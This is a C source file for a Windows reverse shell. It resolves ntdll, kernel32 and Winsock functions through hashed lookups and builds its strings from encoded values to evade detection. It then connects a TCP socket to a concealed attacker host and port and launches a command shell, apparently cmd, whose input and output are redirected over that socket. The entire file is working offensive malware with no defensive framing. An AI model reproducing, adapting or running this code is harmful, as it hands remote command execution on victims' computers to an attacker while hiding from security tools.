#include "../include/main.h"
#include "../include/loaders.h"
#include "../include/functions.h"
#include "../include/utils.h"


int STDCALL WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nShowCmd) {
    void *NtDllPtr = GetDllAddress(NTDHASH);

    if (NtDllPtr != NULL) {
        LoadDllFunc = GetFuncPtr(NtDllPtr, LDRFUNC);

        if (LoadDllFunc != NULL) {
            void           *WinSockDllPtr       = {0};
            UNICODE_STRING  WinSockDllInfo      = {0};
            wchar_t         WSName[100]         = {0};
            GetOriginalStr(WSDLL, WSName);

            WinSockDllInfo.Buffer               = WSName;
            WinSockDllInfo.Length               = 20;
            WinSockDllInfo.MaximumLength        = 22;

            if (LoadDllFunc(NULL, 0, &WinSockDllInfo, &WinSockDllPtr) == 0) {
                WSAStartupFunc  = GetFuncPtr(WinSockDllPtr, WSATART);
                WSASocketFunc   = GetFuncPtr(WinSockDllPtr, WSASOCK);
                WSAConnectFunc  = GetFuncPtr(WinSockDllPtr, WSACONN);

                if (WSAStartupFunc != NULL && WSASocketFunc != NULL, WSAConnectFunc != NULL) {
                    WSADATA         WSAStruct        = {0};

                    if (WSAStartupFunc(MAKEWORD(2, 2), &WSAStruct) == 0) {
                        unsigned long long result  = WSASocketFunc(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

                        if (result != INVALID_SOCKET) {
                            SOCKADDR_IN SocketAddr      = {0};
                            SocketAddr.sin_family       = AF_INET;
                            SocketAddr.sin_port         = H_PORT;
                            SocketAddr.sin_addr.s_addr  = H_IP;

                            if (WSAConnectFunc(result, (SOCKADDR*)&SocketAddr, sizeof(SocketAddr), NULL, NULL, NULL, NULL) == 0) {
                                void *KernelPtr = GetDllAddress(KRN32DL);
                                
                                if (KernelPtr != NULL) {
                                    CreateProcFunc = GetFuncPtr(KernelPtr, CREATEP);
                                    
                                    if (CreateProcFunc != NULL) {
                                        STARTUPINFOW        sinfo           = {0};
                                        PROCESS_INFORMATION pinfo           = {0};
                                        wchar_t             ProcName[100]   = {0};
                                        GetOriginalStr(CMDST, ProcName);

                                        sinfo.cb                    = sizeof(sinfo);
                                        sinfo.dwFlags               = STARTF_USESTDHANDLES;
                                        sinfo.hStdError             = (void*)result;
                                        sinfo.hStdInput             = (void*)result;
                                        sinfo.hStdOutput            = (void*)result;

                                        CreateProcFunc(NULL, ProcName, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    return 20;
}